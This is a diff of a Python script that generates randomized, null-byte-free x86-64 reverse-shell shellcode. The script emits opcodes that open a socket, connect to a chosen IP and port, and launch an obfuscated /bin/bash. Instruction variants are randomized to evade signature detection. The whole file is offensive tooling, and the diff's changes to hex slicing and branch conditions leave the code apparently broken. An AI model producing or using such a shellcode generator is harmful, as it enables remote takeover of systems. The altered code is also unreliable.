@@ -1,10 +1,9 @@
-#/usr/bin/env python3
+#! /usr/bin/python
 
 from random import randint as r
 import socket
 from sys import argv
 
-#import htons
 
 #Fonction qui va vérifier que la string reçue ne contient aucune valeur hexa 0x00 ou 0xFF
 def verifOffus(binBashHexa):
@@ -119,7 +118,7 @@ def create_socket():
     global PAYLOAD
     # syscall
     PAYLOAD += "b029" if r(0,1) else "0429"
-    # On set rbx à 2 pour ensuite le copier dans rdi (le premier cas correspond à "mov bl, 0x02; mov rdi, rbx" le deuxième à "add bl, 0x02, mov rdi, rbx" le troisième correspond à un "inc rdi, inc rdi")
+    # mov bl, 0x02; mov rdi, rbx le deuxième à add bl, 0x02, mov rdi, rbx inc rdi, inc rdi
     rand = r(0,2)
     if rand == 0:
         PAYLOAD += "b3024889df"
@@ -128,7 +127,7 @@ def create_socket():
     elif rand == 2:
         PAYLOAD += "48ffc748ffc7"
     clean("rbx")
-    # set rbx to 1 then copied it on rsi ("mov bl, 0x01; mov rsi, rbx" "add bl, 0x01, mov rsi, rbx" "inc rsi")
+    # mov bl, 0x01 mov rsi, rbx add bl, 0x01, mov rsi, rbx inc rsi
     rand = r(0,2)
     if rand == 0:
         PAYLOAD += "b3014889de"
@@ -141,10 +140,10 @@ def create_socket():
 
 def socket_connect(ip, port):
    global PAYLOAD
-   l = ["4889C74989FA", "4889C74989C2", "50415A4C89D7", "4989C24889C7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+   l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
    PAYLOAD += l[r(0,len(l)-1)]   
    clean("rax")
-   PAYLOAD += "B02A" if r(0,1) else "042A"
+   PAYLOAD += "B02a" if r(0,1) else "042a"
    clean("rbx")
    PAYLOAD += "53" # push rbx
    ip_greater = []
@@ -156,24 +155,27 @@ def socket_connect(ip, port):
     cmp += 1
     
     
-    PAYLOAD += "BE" # mov esi
-    for i in range(0, len(ip_to_substract)):
-        if ip_to_substract[i] < 17: PAYLOAD += "0"
-        PAYLOAD += hex(ip_to_substract[i])[2:]
-
-    PAYLOAD += "81EE" # sub esi
+    PAYLOAD += "be" # mov esi
     for i in range(0,len(ip_greater)):
         if ip_greater[i] < 17: PAYLOAD += "0"
-        PAYLOAD += hex(ip_greater[i])[2:]
+        PAYLOAD += hex(ip_greater[i])[:2]
+        print(hex(ip_greater[i])[2:])
 
-    
-    port = hex(socket.htons(int(port)))[2:]
+
+    PAYLOAD += "83ee" # sub esi
+    for i in range(0, len(ip_to_substract)):
+        if ip_to_substract[i] < 17: PAYLOAD += "0"
+        PAYLOAD += hex(ip_to_substract[i])[:2]
+        print(hex(ip_to_substract[i])[2:])
+
+    #print(PAYLOAD)
+    port = hex(socket.htons(int(port)))[:2]
 
     PAYLOAD += "566668" # push
     PAYLOAD += port[2:] + port[:2] # little endian    
-    PAYLOAD += "666A02" #AF_INET
-    PAYLOAD += "4889E6" if r(0,1) else "4831F64801E6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
-    PAYLOAD += "B218" # mov dl,24
+    PAYLOAD += "666a02" #AF_INET
+    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
+    PAYLOAD += "b218" # mov dl,24
     PAYLOAD += call()
     return PAYLOAD
 
@@ -210,28 +212,25 @@ def shell():
     offuString = offuString[::-1]
 
     PAYLOAD += "48bb"  #mov rbx, ...
-    PAYLOAD+=offuString[:-2] #.../bin/bash en hexa offusqué sans "x0"
+    for i in range(0,15,2):
+        sub = offuString[i+1] + offuString[i] 
+        PAYLOAD+= sub
+                    #.../bin/bash en hexa offusqué    
     PAYLOAD+="4889e7" # mov rdi, rsp
     PAYLOAD+="50" #push rax
     PAYLOAD+="57" #push rdi
     PAYLOAD+="4889e6" #mov rsi, rsp
-    print(PAYLOAD)
 
-    ##Désoffuscation :
+    #Désoffuscation
     #On a add donc on va re sub la différence additionnée
     if factorOffusVar < 0 :
         factorOffusVar *= -1 
-
-        #Si l'opérateur est inférieur à 10
         if factorOffusVar < 10 :
             addString = ""
-            
-            #sub rbx, 0x0.0.0.0.0.0.0.0.
             for i in range(7):
                 addString+="0"+str(factorOffusVar)
             PAYLOAD+="4883eb"+addString
         
-        #Si l'opérateur est supérieur à 10
         elif factorOffusVar >= 10 :
             newFactor = ""
             if factorOffusVar == 10 : newFactor = "a"
@@ -240,8 +239,7 @@ def shell():
             elif factorOffusVar == 13 : newFactor = "d"
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
-            
-            #sub rbx, 0x0.0.0.0.0.0.0.0.
+
             for i in range(7):
                 addString+="0"+str(newFactor)
 
@@ -249,18 +247,15 @@ def shell():
         
     #On a sub donc on va re add la différence soustraite
     elif factorOffusVar > 0 :
-        #Si l'opérateur est supérieur ou égale à -10
-        if factorOffusVar > -10 :
-            addString = ""
+        if factorOffusVar <= -10 :
 
-            #add rbx, 0x0.0.0.0.0.0.0.0. 
+            addString = ""
             for i in range(7):
                 addString+="0"+str(factorOffusVar)
 
             PAYLOAD+="4883c3"+addString
         
-        #Si l'opérateur est supérieur à 10
-        elif factorOffusVar <= -10 :
+        elif factorOffusVar > -10 :
             newFactor = ""
             if factorOffusVar == 10 : newFactor = "a"
             elif factorOffusVar == 11 : newFactor = "b"
@@ -268,8 +263,7 @@ def shell():
             elif factorOffusVar == 13 : newFactor = "d"
             elif factorOffusVar == 14 : newFactor = "e"
             elif factorOffusVar == 15 : newFactor = "f"
-            
-            #add rbx, 0x0.0.0.0.0.0.0.0. 
+
             for i in range(7):
                 addString+="0"+str(newFactor)
 
@@ -320,4 +314,4 @@ shell()
 _exit()
 #print(bit_to_opcode(PAYLOAD))
 #print(PAYLOAD)
-print(shellcodize(PAYLOAD))
+print(shellcodize(PAYLOAD.lower()))
